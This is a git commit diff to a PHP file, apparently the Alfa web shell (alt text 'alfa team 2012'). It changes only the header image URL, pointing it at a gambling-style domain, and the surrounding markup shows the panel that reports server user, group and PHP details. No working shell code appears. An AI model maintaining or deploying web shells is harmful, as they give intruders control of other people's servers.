82c3de3f19739c756e6659f1a9a11340fa63bf50
vxtrem <tk2mueetizing@gmail.com>
2025-02-26 20:46:52 +0700

    Update scrip.php

--- scrip.php
+++ scrip.php
@@ -1109,7 +1109,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/CallMeBatosay/Bantaiii/main/photo_2024-05-09_04-23-40.gif" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="alfa team 2012" draggable="false" src="https://tokoserverbandung.com/jitutoto777.gif" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
